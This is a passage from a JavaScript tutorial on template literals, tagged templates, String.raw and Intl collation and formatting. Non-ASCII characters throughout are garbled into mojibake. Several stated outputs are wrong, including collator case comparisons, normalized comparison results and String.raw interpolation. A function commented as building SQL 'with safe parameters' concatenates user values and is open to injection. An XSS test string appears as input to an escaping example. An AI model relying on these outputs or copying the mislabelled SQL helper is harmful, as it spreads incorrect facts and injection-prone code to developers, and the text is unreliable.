**Template literals** are delimited by backticks (`) instead of quotes.

```javascript
// Basic template
let str = `Hello World`;
typeof str;                 // 'string' (same type as quoted strings)

// Identical to quoted strings
`hello` === 'hello';        // true
`hello` === "hello";        // true

// Expression interpolation with ${}
let name = 'Alice';
let greeting = `Hello, ${name}!`;
greeting                    // 'Hello, Alice!'

// Expressions (not just variables)
let a = 5, b = 10;
let math = `${a} + ${b} = ${a + b}`;
math                        // '5 + 10 = 15'

// Function calls
function getGreeting() {
  return 'Howdy';
}

let msg = `${getGreeting()}, partner!`;
msg                         // 'Howdy, partner!'

// Method calls
let user = { name: 'Bob', age: 25 };
let info = `User: ${user.name.toUpperCase()}, Age: ${user.age + 1}`;
info                        // 'User: BOB, Age: 26'

// Array access
let colors = ['red', 'green', 'blue'];
let first = `First color: ${colors[0]}`;
first                       // 'First color: red'

// Object properties
let obj = { x: 10, y: 20 };
let point = `Point(${obj.x}, ${obj.y})`;
point                       // 'Point(10, 20)'

// Nested templates
let outer = `outer: ${`inner`}`;
outer                       // 'outer: inner'

// Complex nested expressions
let nested = `Result: ${1 + 2 + `sum${3 + 4}`}`;
nested                      // 'Result: 3sum7'

// Ternary expressions
let age = 25;
let status = `Age is ${age >= 18 ? 'adult' : 'minor'}`;
status                      // 'Age is adult'

// Boolean expressions
let loggedIn = true;
let welcome = `${loggedIn ? 'Welcome back!' : 'Please log in'}`;
welcome                     // 'Welcome back!'

// Logical operators
let value = 42;
let result = `Value: ${value && value * 2}`;
result                      // 'Value: 84'

// Empty expressions (allowed but unusual)
`Empty: ${''}`;             // 'Empty: '

// Expressions with side effects (avoid!)
let counter = 0;
let bad = `Count: ${++counter}`;
bad                         // 'Count: 1'
counter                     // 1 (modified as side effect)

// Multi-line strings
let multiline = `Line 1
Line 2
Line 3`;
multiline                   // 'Line 1\nLine 2\nLine 3'

// Indentation preservation
let indented = `
  This is indented
    This is more indented
  Back to first level
`;
// Includes leading newline and all spaces!

// Better: use trim()
let clean = `
  Clean indentation
  No leading newline
  No extra spaces
`.trim();
// 'Clean indentation\nNo leading newline\nNo extra spaces'

// Join lines for cleaner template
let template = [
  'Line 1',
  'Line 2',
  'Line 3'
].join('\n');
// 'Line 1\nLine 2\nLine 3'

// Escape sequences work in templates
let escaped = `Tab:\tNewline:\nBackslash:\\`;
escaped                     // 'Tab:  Newline:\nBackslash:\'

// Dollar sign escaping
let price = `Price: $100`;
price                       // 'Price: $100' (no interpolation)

let escaped$ = `Escape: \${name}`;
escaped$                    // 'Escape: ${name}' (shows literal ${})

// Backtick escaping
let backtick = `This has a \` backtick`;
backtick                    // 'This has a ` backtick'

// Performance: templates vs concatenation
// Modern engines optimize templates well
let a1 = `Hello ${name}`;         // âœ“ Clear and fast
let a2 = 'Hello ' + name;         // âœ“ Also fast
let a3 = 'Hello '.concat(name);   // âœ“ Also fast

// Complex formatting use case
function formatUserProfile(user) {
  return `
    Name: ${user.name}
    Email: ${user.email}
    Status: ${user.active ? 'Active' : 'Inactive'}
    Created: ${new Date(user.created).toLocaleDateString()}
  `.trim();
}

// For large documents, template is cleaner
let largeTpl = `
  <!DOCTYPE html>
  <html>
  <head>
    <title>${title}</title>
  </head>
  <body>
    <h1>${heading}</h1>
    <p>${content}</p>
  </body>
  </html>
`.trim();
```

---

### 8.3.2 Multi-line Strings and Formatting

**Multi-line strings** are a major benefit of template literals.

```javascript
// HTML without concatenation
let html = `
  <div class="card">
    <h1>${title}</h1>
    <p>${description}</p>
  </div>
`;

// SQL queries
let query = `
  SELECT * FROM users
  WHERE age > ${minAge}
  AND status = '${status}'
  ORDER BY created_at DESC
`;

// JSON-like structure
let data = `
{
  "name": "${user.name}",
  "email": "${user.email}",
  "age": ${user.age},
  "active": ${user.active}
}
`;

// API request body
let apiBody = `
{
  "query": "${searchTerm}",
  "limit": ${pageSize},
  "offset": ${offset}
}
`;

// Markdown content
let markdown = `
# ${title}

## Overview
${description}

## Features
- ${features.join('\n- ')}

## Usage
\`\`\`javascript
${codeExample}
\`\`\`
`;

// CSS styling
let styles = `
.button {
  background: ${buttonColor};
  padding: ${padding}px;
  border-radius: ${radius}px;
  font-size: ${fontSize}px;
}
`;

// Console output formatting
let report = `
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘         Test Report            â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘ Passed: ${passed.toString().padStart(2)}               â•‘
â•‘ Failed: ${failed.toString().padStart(2)}               â•‘
â•‘ Skipped: ${skipped.toString().padStart(2)}              â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
`;

// Handling indentation properly
function formatTemplate(str) {
  // Remove first and last empty lines
  let lines = str.split('\n').slice(1, -1);
  
  // Find minimum indentation
  let minIndent = lines
    .filter(line => line.trim())
    .reduce((min, line) => {
      let indent = line.match(/^ */)[0].length;
      return Math.min(min, indent);
    }, Infinity);
  
  // Remove minimum indentation from all lines
  return lines
    .map(line => line.slice(minIndent))
    .join('\n');
}

let properlyIndented = formatTemplate(`
  <div>
    <h1>Title</h1>
    <p>Paragraph</p>
  </div>
`);
// '<div>\n  <h1>Title</h1>\n  <p>Paragraph</p>\n</div>'

// Common pattern: array of lines
let lines = [
  'First line',
  'Second line',
  'Third line'
];

let joined = lines.join('\n');
// Often better than template for complex logic

// Multi-line with expressions
let complexHtml = `
  <ul>
    ${items.map(item => `<li>${item}</li>`).join('\n    ')}
  </ul>
`;
```

---

### 8.3.3 Tagged Templates

**Tagged templates** process templates through a function for custom behavior.

```javascript
// Basic tag function
function tag(strings, ...values) {
  console.log(strings);  // Array of string parts
  console.log(values);   // Array of expression values
  return 'result';
}

let name = 'Alice';
let result = tag`Hello ${name}!`;
// strings = ['Hello ', '!']
// values = ['Alice']
// result = 'result'

// Tag function that processes templates
function highlight(strings, ...values) {
  let result = '';
  for (let i = 0; i < strings.length; i++) {
    result += strings[i];
    if (i < values.length) {
      result += `<mark>${values[i]}</mark>`;
    }
  }
  return result;
}

let text = 'I like';
let color = 'red';
let tagged = highlight`${text} the color ${color}`;
// '<mark>I like</mark> the color <mark>red</mark>'

// HTML escaping tag
function html(strings, ...values) {
  function escape(str) {
    return String(str)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  }
  
  let result = '';
  for (let i = 0; i < strings.length; i++) {
    result += strings[i];
    if (i < values.length) {
      result += escape(values[i]);
    }
  }
  return result;
}

let userInput = '<script>alert("XSS")</script>';
let safe = html`<div>${userInput}</div>`;
// '<div>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div>'

// Translation/localization tag
function translate(strings, ...values) {
  let templates = {
    'Hello {0}!': `Â¡Hola {0}!`,
    'Goodbye {0}': `AdiÃ³s {0}`
  };
  
  let template = strings.join('{}');
  let translated = templates[template] || template;
  
  let parts = translated.split('{}');
  let result = '';
  for (let i = 0; i < parts.length; i++) {
    result += parts[i];
    if (i < values.length) {
      result += values[i];
    }
  }
  return result;
}

let spanish = translate`Hello ${'Alice'}!`;
// 'Â¡Hola Alice!'

// CSS-in-JS helper
function css(strings, ...values) {
  let result = '';
  for (let i = 0; i < strings.length; i++) {
    result += strings[i];
    if (i < values.length) {
      result += values[i];
    }
  }
  return result.trim();
}

let buttonStyle = css`
  background: ${buttonColor};
  padding: ${padding}px;
  border-radius: ${radius}px;
`;

// SQL query builder with parameterization
function sql(strings, ...values) {
  let params = [];
  let query = '';
  
  for (let i = 0; i < strings.length; i++) {
    query += strings[i];
    if (i < values.length) {
      params.push(values[i]);
      query += `$${params.length}`;  // Parameterized
    }
  }
  
  return { query, params };
}

let { query, params } = sql`
  SELECT * FROM users
  WHERE name = ${name}
  AND age > ${age}
`;
// query = 'SELECT * FROM users\nWHERE name = $1\nAND age > $2'
// params = ['Alice', 25]

// GraphQL query builder
function gql(strings, ...values) {
  let result = '';
  for (let i = 0; i < strings.length; i++) {
    result += strings[i];
    if (i < values.length) {
      result += values[i];
    }
  }
  return result;
}

let query2 = gql`
  query GetUser($id: ID!) {
    user(id: $id) {
      name
      email
    }
  }
`;

// Dedent tag (removes common leading whitespace)
function dedent(strings, ...values) {
  let result = '';
  for (let i = 0; i < strings.length; i++) {
    result += strings[i];
    if (i < values.length) {
      result += values[i];
    }
  }
  
  let lines = result.split('\n');
  let minIndent = lines
    .filter(line => line.trim())
    .reduce((min, line) => {
      let indent = line.match(/^ */)[0].length;
      return Math.min(min, indent);
    }, Infinity);
  
  return lines
    .map(line => line.slice(minIndent))
    .join('\n')
    .trim();
}

let code = dedent`
  function add(a, b) {
    return a + b;
  }
`;

// Terminal colors tag
function color(strings, ...values) {
  const colors = {
    red: '\x1b[31m',
    green: '\x1b[32m',
    reset: '\x1b[0m'
  };
  
  let result = '';
  for (let i = 0; i < strings.length; i++) {
    result += strings[i];
    if (i < values.length) {
      result += `${colors.red}${values[i]}${colors.reset}`;
    }
  }
  return result;
}

console.log(color`Error: ${'file not found'}`);
// Outputs with red colored error message

// Custom formatters
function table(strings, ...values) {
  let headers = strings[0].trim().split('\n');
  let rows = values.map((val, i) => {
    let content = Array.isArray(val) ? val.join(' | ') : val;
    return `${content}`;
  });
  return [headers, ...rows].join('\n');
}

// Multiple template expressions
let a = 'hello', b = 'world';
let both = dedent`
  First: ${a}
  Second: ${b}
`;
```

---

### 8.3.4 String.raw and Raw Strings

**String.raw** preserves escape sequences without processing them.

```javascript
// Regular string: escape sequences are processed
let regular = `Line 1\nLine 2`;
regular                    // 'Line 1\nLine 2' (newline)
regular.length;            // 13

// Raw string: escape sequences are literal
let raw = String.raw`Line 1\nLine 2`;
raw                        // 'Line 1\\nLine 2' (backslash-n)
raw.length;                // 14

// Difference visualized
console.log(regular);      // Line 1
                           // Line 2

console.log(raw);          // Line 1\nLine 2

// Backslash preservation
let path1 = `C:\Users\Documents`;   // 'C:UsersDocuments' (wrong!)
let path2 = String.raw`C:\Users\Documents`;  // 'C:\Users\Documents' (correct!)

// Windows paths
let winPath = String.raw`C:\Program Files\App\config.ini`;
winPath                    // 'C:\Program Files\App\config.ini'

// Regex patterns (raw is clearer)
let regex1 = /\d+\.\d+/;   // Already escaped
let regex2 = String.raw`\d+\.\d+`;  // String representation
String(regex2);            // '\\d+\\.\\d+'

// With template expressions
let dir = 'Users';
let raw2 = String.raw`C:\${dir}\Documents`;
raw2                       // 'C:\Users\Documents'

// In tagged templates
function raw(strings, ...values) {
  let result = '';
  for (let i = 0; i < strings.length; i++) {
    result += strings.raw[i];  // Access raw strings
    if (i < values.length) {
      result += values[i];
    }
  }
  return result;
}

let latex = raw`\frac{${numerator}}{${denominator}}`;
latex                      // Preserves LaTeX backslashes

// File paths across platforms
let linuxPath = String.raw`/home/user/documents`;
let mixedPath = String.raw`\\server\share\file`;

// LaTeX/Math strings
let math = String.raw`E = mc^2`;
// Or: `E = mc^2` (both work, raw is explicit)

// JSON strings that contain backslashes
let jsonRaw = String.raw`{"regex": "\d+", "path": "C:\Users"}`;
jsonRaw                    // Preserves backslashes for valid JSON

// URL patterns (avoid double-escaping)
let urlPattern = String.raw`^https?://[\w\-\.]+\.\w+$`;
urlPattern                 // Clean regex pattern
```

---

### 8.3.5 Practical Use Cases

**Real-world applications** of template literals.

```javascript
// HTML rendering with data
function renderCard(data) {
  return `
    <div class="card">
      <h2>${data.title}</h2>
      <p>${data.description}</p>
      <footer>${new Date(data.date).toLocaleDateString()}</footer>
    </div>
  `;
}

// List rendering
function renderList(items) {
  return `
    <ul>
      ${items.map(item => `<li>${item}</li>`).join('')}
    </ul>
  `;
}

// Conditional rendering
function renderStatus(user) {
  return `
    <div>
      ${user.active ? `<span class="active">Active</span>` : `<span class="inactive">Inactive</span>`}
    </div>
  `;
}

// API call formatting
function buildQuery(filters) {
  return Object.entries(filters)
    .filter(([key, value]) => value !== null)
    .map(([key, value]) => `${key}=${encodeURIComponent(value)}`)
    .join('&');
}

// Error message formatting
function errorMessage(error) {
  return `
    âŒ Error: ${error.message}
    Stack: ${error.stack}
    Time: ${new Date().toISOString()}
  `.trim();
}

// Database connection string
function connectionString(config) {
  return `postgresql://${config.user}:${config.password}@${config.host}:${config.port}/${config.database}`;
}

// Email template
function emailTemplate(user, order) {
  return `
    Dear ${user.name},
    
    Thank you for your order #${order.id}
    
    Items:
    ${order.items.map(item => `- ${item.name} x${item.qty}: $${item.price}`).join('\n')}
    
    Total: $${order.total}
    
    Best regards,
    The Store
  `.trim();
}

// Logging with context
function log(level, message, context) {
  let timestamp = new Date().toISOString();
  return `[${timestamp}] ${level}: ${message} ${JSON.stringify(context)}`;
}

// Type definitions (JSDoc)
function calculate(/** @type {number} */ a, /** @type {number} */ b) {
  return `Result: ${a + b}`;
}

// Build configuration
const buildConfig = `
{
  "name": "my-app",
  "version": "${VERSION}",
  "entry": "${ENTRY_POINT}",
  "output": "${OUTPUT_DIR}",
  "mode": "${MODE}",
  "target": "${TARGET}"
}
`;

// Dynamic CSS
const themeCSS = `
:root {
  --primary: ${colors.primary};
  --secondary: ${colors.secondary};
  --font-size: ${fontSizes.base}px;
  --spacing: ${spacing.unit}px;
}
`;

// SQL with safe parameters (real implementation would use prepared statements)
function buildSQL(table, where, values) {
  let conditions = Object.entries(where)
    .map(([key, value]) => `${key} = '${value}'`)
    .join(' AND ');
  return `SELECT * FROM ${table} WHERE ${conditions}`;
}

// Command line interface
function cliOutput(data) {
  return `
    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    â•‘  ${data.title.padEnd(28)} â•‘
    â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
    ${data.rows.map(row => `â•‘  ${row.padEnd(28)} â•‘`).join('\n')}
    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  `;
}

// Performance comparison
console.time('concatenation');
let result1 = '';
for (let i = 0; i < 1000; i++) {
  result1 = result1 + `Item ${i}, `;
}
console.timeEnd('concatenation');

console.time('template');
let items = [];
for (let i = 0; i < 1000; i++) {
  items.push(`Item ${i}`);
}
let result2 = items.join(', ');
console.timeEnd('template');

// Modern practice: template literals are idiomatic
// Use for clarity, not necessarily performance
// They perform well in modern engines
```
## 8.4 String Internationalization (i18n)

**Internationalization** handles locale-specific string operations for languages, character sets, and cultural conventions. JavaScript provides the `Intl` API for proper i18n support.

---

### 8.4.1 Intl.Collator

**Collator** performs locale-aware string comparison following linguistic rules.

```javascript
// Basic comparison (UTF-16 code point order - wrong for most languages!)
'Ã¤' > 'z';                  // true (code point order)

// Correct linguistic comparison
let collator = new Intl.Collator('de');  // German locale
collator.compare('Ã¤', 'z');  // -1 (Ã¤ < z in German)

// Create collator for specific language
let collatorDE = new Intl.Collator('de-DE');  // German (Germany)
let collatorFR = new Intl.Collator('fr-FR');  // French (France)
let collatorES = new Intl.Collator('es-ES');  // Spanish (Spain)

// Compare strings
collatorDE.compare('apple', 'Apple');  // 0 (case-insensitive by default)
collatorDE.compare('apple', 'Ã¤pple');  // 1 (a > Ã¤)

// Compare results
// Negative: first string < second string
// Zero: strings are equal (for comparison purposes)
// Positive: first string > second string

collator.compare('a', 'b');  // -1
collator.compare('b', 'a');  // 1
collator.compare('a', 'a');  // 0

// Sorting with locale awareness
let names = ['Zachary', 'Anna', 'Ã„nne', 'Bea'];
let collator2 = new Intl.Collator('en-US');
names.sort(collator2.compare);
// ['Anna', 'Ã„nne', 'Bea', 'Zachary'] (locale-aware order)

// Without locale awareness
names.sort((a, b) => a.localeCompare(b, 'en-US'));
// Same result, different API

// Swedish collation (different from German)
let swCollator = new Intl.Collator('sv-SE');
let frCollator = new Intl.Collator('fr-FR');

// Same words, different order in different languages
let words = ['tio', 'tionde', 'tidigare'];
words.sort(swCollator.compare);    // Swedish order
words.sort(frCollator.compare);    // French order

// Case sensitivity options
let options1 = { caseFirst: 'upper' };  // Uppercase first
let collatorUpper = new Intl.Collator('en-US', options1);
collatorUpper.compare('a', 'A');  // 1 (A < a)

let options2 = { caseFirst: 'lower' };  // Lowercase first
let collatorLower = new Intl.Collator('en-US', options2);
collatorLower.compare('a', 'A');  // -1 (a < A)

// Numeric sorting
let numbers = ['10', '2', '1', '20'];
numbers.sort();              // ['1', '10', '2', '20'] (string order)

let numericCollator = new Intl.Collator('en-US', { numeric: true });
numbers.sort(numericCollator.compare);  // ['1', '2', '10', '20'] (numeric)

// Case insensitivity
let options3 = { sensitivity: 'accent' };  // Ignore case, respect accents
let accentCollator = new Intl.Collator('en-US', options3);
accentCollator.compare('cafÃ©', 'cafe');  // 1 (different due to accent)

// Sensitivity levels
// 'base': Ignore case, accents, and variants (a â‰ˆ A â‰ˆ Ã¡ â‰ˆ Ã¤)
// 'accent': Ignore case but respect accents (a â‰ˆ A, but Ã¡ â‰  a)
// 'case': Ignore accents but respect case (Ã¡ â‰ˆ a, but A â‰  a)
// 'variant': Respect all differences (default)

let baseCollator = new Intl.Collator('en-US', { sensitivity: 'base' });
baseCollator.compare('cafÃ©', 'CAFE');  // 0 (considered equal)

// Ignore punctuation and spaces
let options4 = { ignorePunctuation: true };
let punctCollator = new Intl.Collator('en-US', options4);
punctCollator.compare('hello-world', 'helloworld');  // 0 (punctuation ignored)

// Resolve options (see what options were actually used)
let collator3 = new Intl.Collator('en-US', { numeric: true });
console.log(collator3.resolvedOptions());
// { locale: 'en-US', usage: 'sort', sensitivity: 'variant', numeric: true, ... }

// Binary collation (fast, but not locale-aware)
let binaryCollator = new Intl.Collator('en-US', { usage: 'search' });
// Different performance characteristics

// Real-world: Sort user list
function sortUsersByName(users, locale) {
  let collator = new Intl.Collator(locale);
  return users.sort((a, b) => collator.compare(a.name, b.name));
}

sortUsersByName([
  { name: 'Anna' },
  { name: 'Ã„nne' },
  { name: 'Bea' }
], 'de-DE');

// Unicode collation algorithm (CLDR)
// JavaScript uses CLDR for comprehensive i18n support
// Each locale has specific sorting rules
```

---

### 8.4.2 Locale-Aware String Operations

**Locale-aware methods** handle language-specific transformations.

```javascript
// localeCompare() - ES3 method (pre-Intl alternative)
'a'.localeCompare('b', 'en-US');  // -1
'b'.localeCompare('a', 'en-US');  // 1
'a'.localeCompare('a', 'en-US');  // 0

// Equivalent to Intl.Collator but simpler
// localeCompare automatically handles many details

// Turkish: special I handling
let turkishCollator = new Intl.Collator('tr-TR');
'i'.localeCompare('I', 'tr-TR');  // Different in Turkish!

// German: ÃŸ (sharp s) sorting
let germanCollator = new Intl.Collator('de-DE');
'ÃŸ'.localeCompare('ss', 'de-DE');  // 0 (considered equivalent)

// Chinese: tone marks
let zhCollator = new Intl.Collator('zh-Hans');
'mÄ'.localeCompare('mÃ¡', 'zh-Hans');  // -1 (different tones)

// Locale fallback
let unknown = new Intl.Collator('xyz-ABC');  // Non-existent locale
console.log(unknown.resolvedOptions().locale);  // Falls back to default

// List of available locales
let locales = Intl.Collator.supportedLocalesOf(['de', 'fr', 'xyz']);
// ['de', 'fr'] (xyz not supported)

// Right-to-left languages (Arabic, Hebrew)
let arabicCollator = new Intl.Collator('ar-SA');
// Handles RTL text properly

// Vietnamese: combining characters
'Viá»‡t'.localeCompare('Vietnam', 'vi-VN');  // Proper Vietnamese comparison

// Polish: special characters
'Å‚'.localeCompare('l', 'pl-PL');  // -1 (Å‚ is distinct from l)

// Real-world: Search with locale awareness
function findByName(users, searchName, locale) {
  let collator = new Intl.Collator(locale, { sensitivity: 'base' });
  return users.filter(user => 
    collator.compare(user.name.toLowerCase(), searchName.toLowerCase()) === 0
  );
}

// Case conversion considerations
let str = 'Ä°stanbul';        // Turkish: capital I with dot
str.toLowerCase();           // 'istanbul' (or 'iÌ‡stanbul' - varies)
str.toLocaleLowerCase('tr'); // 'istanbul' (Turkish-aware)

let str2 = 'straÃŸe';         // German: lowercase sharp s
str2.toUpperCase();          // 'STRASSE' (becomes ss)
str2.toLocaleUpperCase('de'); // 'STRASSE' (German-aware)

// JavaScript has limited toLocaleUpperCase/toLowerCase
// Most work is done by browser/runtime

// Japanese: hiragana to katakana (limited support)
// Most special conversions require libraries

// Normalization (Unicode NFC vs NFD)
let composed = 'Ã©';         // Precomposed form
let decomposed = 'e\u0301'; // Decomposed form

composed.localeCompare(decomposed, 'en-US');  // -1 (different!)
composed.normalize('NFC').localeCompare(decomposed.normalize('NFC'), 'en-US');  // 0 (same after normalization)

// Proper comparison for visually identical strings
function compareNormalized(str1, str2, locale) {
  return str1.normalize('NFC').localeCompare(str2.normalize('NFC'), locale);
}

compareNormalized('cafÃ©', 'cafe\u0301', 'en-US');  // 1 (with vs without accent)

// For locale-aware string matching
function fuzzyMatch(str, pattern, locale) {
  let collator = new Intl.Collator(locale, { sensitivity: 'base' });
  return collator.compare(str, pattern) === 0;
}

fuzzyMatch('CafÃ©', 'cafe', 'en-US');  // true (ignoring case and accents)
```

---

### 8.4.3 Formatting with Locales

**Number, date, and currency formatting** depends on locale.

```javascript
// Number formatting by locale
let formatter_US = new Intl.NumberFormat('en-US');
formatter_US.format(1234.56);   // '1,234.56' (US format)

let formatter_DE = new Intl.NumberFormat('de-DE');
formatter_DE.format(1234.56);   // '1.234,56' (German format)

let formatter_FR = new Intl.NumberFormat('fr-FR');
formatter_FR.format(1234.56);   // '1 234,56' (French format)

// Currency formatting
let currencyUS = new Intl.NumberFormat('en-US', { 
  style: 'currency', 
  currency: 'USD' 
});
currencyUS.format(1234.56);     // '$1,234.56'

let currencyEU = new Intl.NumberFormat('de-DE', { 
  style: 'currency', 
  currency: 'EUR' 
});
currencyEU.format(1234.56);     // '1.234,56 â‚¬'

// Date formatting
let dateUS = new Intl.DateTimeFormat('en-US');
dateUS.format(new Date('2024-02-08'));  // '2/8/2024'

let dateDE = new Intl.DateTimeFormat('de-DE');
dateDE.format(new Date('2024-02-08'));  // '8.2.2024'

// Time formatting
let timeUS = new Intl.DateTimeFormat('en-US', { 
  hour: '2-digit', 
  minute: '2-digit' 
});
timeUS.format(new Date());      // '02:30 PM' (or AM)

let timeDE = new Intl.DateTimeFormat('de-DE', { 
  hour: '2-digit', 
  minute: '2-digit' 
});
timeDE.format(new Date());      // '14:30' (24-hour format)

// Collation performance implications
// Intl.Collator is optimized but slower than simple string comparison
// Use for user-facing sorting, cache collators for batch operations

let collator = new Intl.Collator('en-US');
let largeList = [...Array(10000).keys()].map(i => String(i));

console.time('collator sort');
largeList.sort(collator.compare);
console.timeEnd('collator sort');

console.time('binary sort');
largeList.sort((a, b) => a.localeCompare(b));
console.timeEnd('binary sort');

// Create collator once, reuse for multiple comparisons
function sortByLocale(items, locale) {
  let collator = new Intl.Collator(locale);
  return items.sort(collator.compare);  // Reuse single collator
}

// Not: creating new collator each comparison
items.sort((a, b) => 
  new Intl.Collator(locale).compare(a, b)  // âŒ Inefficient
);

// Pluralization (Intl.PluralRules - ES2018)
let pluralUS = new Intl.PluralRules('en-US');
pluralUS.select(0);         // 'other'
pluralUS.select(1);         // 'one'
pluralUS.select(2);         // 'other'

let pluralPL = new Intl.PluralRules('pl-PL');
pluralPL.select(1);         // 'one'
pluralPL.select(2);         // 'few' (Polish has more categories)
pluralPL.select(5);         // 'many'

function formatItems(count, locale) {
  let plural = new Intl.PluralRules(locale);
  let category = plural.select(count);
  
  switch(category) {
    case 'one': return `${count} item`;
    case 'other': return `${count} items`;
  }
}

formatItems(1, 'en-US');    // '1 item'
formatItems(5, 'en-US');    // '5 items'

// List formatting (Intl.ListFormat - ES2021)
let listFormatter = new Intl.ListFormat('en-US', { 
  style: 'long', 
  type: 'conjunction' 
});
listFormatter.format(['apple', 'banana', 'cherry']);
// 'apple, banana, and cherry'

let listShort = new Intl.ListFormat('en-US', { 
  style: 'short' 
});
listShort.format(['apple', 'banana', 'cherry']);
// 'apple, banana, cherry'

// Relative time formatting (Intl.RelativeTimeFormat - ES2020)
let rtf = new Intl.RelativeTimeFormat('en-US');
rtf.format(-1, 'day');      // 'yesterday'
rtf.format(0, 'day');       // 'today'
rtf.format(1, 'day');       // 'tomorrow'
rtf.format(-2, 'week');     // '2 weeks ago'

// Real-world: Multi-language application
class Translator {
  constructor(locale) {
    this.locale = locale;
    this.collator = new Intl.Collator(locale);
    this.numberFormatter = new Intl.NumberFormat(locale);
    this.dateFormatter = new Intl.DateTimeFormat(locale);
  }
  
  sort(items) {
    return items.sort(this.collator.compare);
  }
  
  formatNumber(num) {
    return this.numberFormatter.format(num);
  }
  
  formatDate(date) {
    return this.dateFormatter.format(date);
  }
}

let german = new Translator('de-DE');
let sorted = german.sort(['Bea', 'Anna', 'Ã„nne']);
// ['Anna', 'Ã„nne', 'Bea']

// Browser detection of user locale
let userLocale = navigator.language;  // 'en-US', 'de-DE', etc.

// Server-side (Node.js) locale handling
// Requires explicit locale data

// Locale selection best practices
// 1. Use navigator.language for browser
// 2. Use navigator.languages for array of preferences
// 3. Have fallback locale (usually 'en-US')
// 4. Cache collators/formatters for performance
// 5. Let browser/server provide locale, don't force it

function getUserLocale() {
  return navigator.languages?.[0] || navigator.language || 'en-US';
}

let userLoc = getUserLocale();  // Use for all Intl operations
```

---

### 8.4.4 Best Practices and Gotchas

**Common mistakes** and **proper patterns** for i18n.

```javascript
// âŒ WRONG: Assuming English sorting rules
['Ã¤', 'z', 'a'].sort();     // ['a', 'Ã¤', 'z'] (code point order)

// âœ“ CORRECT: Use locale-aware sorting
let collator = new Intl.Collator('de-DE');
['Ã¤', 'z', 'a'].sort(collator.compare);  // ['a', 'Ã¤', 'z'] (German order)

// âŒ WRONG: Case conversion without locale
let word = 'straÃŸe';
word.toUpperCase();         // 'STRASSE' (loses context)

// âœ“ CORRECT: Use locale-aware conversion
word.toLocaleUpperCase('de-DE');  // 'STRASSE' (German-aware)

// âŒ WRONG: Comparing strings without normalization
let s1 = 'cafÃ©';           // Precomposed
let s2 = 'cafe\u0301';     // Decomposed
s1 === s2;                  // false (but visually identical!)

// âœ“ CORRECT: Normalize before comparison
s1.normalize('NFC') === s2.normalize('NFC');  // true

// âŒ WRONG: Creating collator inside loop
for (let item of items) {
  results.push(items.filter(i => 
    new Intl.Collator(locale).compare(i, item) === 0  // Inefficient!
  ));
}

// âœ“ CORRECT: Create collator once
let collator = new Intl.Collator(locale);
for (let item of items) {
  results.push(items.filter(i => 
    collator.compare(i, item) === 0  // Reuse!
  ));
}

// âŒ WRONG: Assuming ASCII-only strings
let str = 'Ã‘oÃ±o';
str.charAt(0) === 'Ã‘';      // true (but might break with combining chars)

// âœ“ CORRECT: Use spread or Array.from for proper character access
let chars = [...'Ã‘oÃ±o'];
chars[0];                   // 'Ã‘' (correct even with complex chars)

// âŒ WRONG: Manual implementation of collation
function compare(a, b) {
  return a.charCodeAt(0) - b.charCodeAt(0);  // Wrong for many languages!
}

// âœ“ CORRECT: Use Intl API
let collator = new Intl.Collator(locale);
collator.compare(a, b);     // Correct for any language

// âŒ WRONG: Ignoring RTL languages
// HTML: "Hello Ù…Ø±Ø­Ø¨Ø§" (mixing LTR and RTL)
// May display incorrectly without proper markup

// âœ“ CORRECT: Use dir attribute
// <div dir="auto">Hello Ù…Ø±Ø­Ø¨Ø§</div>
// <div dir="ltr">English text</div>
// <div dir="rtl">Ù†Øµ Ø¹Ø±Ø¨ÙŠ</div>

// Performance considerations
// Intl APIs are slower than simple string operations
// But necessary for correctness in multi-language apps

// Benchmark: 10,000 comparisons
let data = Array(10000).fill(0).map((_, i) => String(i));

// Simple comparison (fast, wrong for non-ASCII)
console.time('simple');
data.sort((a, b) => a > b ? 1 : a < b ? -1 : 0);
console.timeEnd('simple');

// Locale-aware (slower, correct)
let collator = new Intl.Collator('en-US');
console.time('collator');
data.sort(collator.compare);
console.timeEnd('collator');

// Difference usually <5-10ms for typical data

// Platform differences
// Intl support varies by browser/environment
// Always check support with try/catch

try {
  let collator = new Intl.Collator('en-US');
  items.sort(collator.compare);
} catch (e) {
  // Fallback to simple sort
  items.sort((a, b) => a.localeCompare(b));
}

// Locale data
// JavaScript relies on OS/browser for locale data
// Locale availability varies by platform

// Check support
let supported = Intl.Collator.supportedLocalesOf(['de', 'fr', 'xyz']);
// May return ['de', 'fr'] if xyz not supported

// Security: Locale injection
// Don't use user input for locale parameter
// âŒ let locale = userInput;  // Could be malicious
// âœ“ let locale = supportedLocales[userInput] || 'en-US';

// Testing i18n
function testCollator() {
  let collator = new Intl.Collator('de-DE');
  
  assert(collator.compare('Ã„', 'Z') < 0, 'German: Ã„ < Z');
  assert(collator.compare('ÃŸ', 'ss') === 0, 'German: ÃŸ = ss');
  assert(collator.compare('a', 'A') === 0, 'Case insensitive');
}

// Real-world: User preferences
class UserSettings {
  constructor(userId, preferences) {
    this.locale = preferences.locale || navigator.language;
    this.collator = new Intl.Collator(this.locale);
    this.numberFormatter = new Intl.NumberFormat(this.locale);
  }
  
  sortList(items) {
    return items.sort(this.collator.compare);
  }
  
  formatNumber(num) {
    return this.numberFormatter.format(num);
  }
}

// Server-side i18n (Node.js)
// Requires explicit configuration
// Example with ICU library:
// const { Collator } = require('icu4x');
// let collator = new Collator('de-DE');
```

---

## Summary: String Internationalization

**Key Takeaways:**

1. **Use Intl APIs** for any language-dependent string operations
2. **Create collators once** and reuse for performance
3. **Normalize strings** before comparison (NFC form)
4. **Respect user locale** from navigator or preferences
5. **Test with multiple languages** including RTL scripts
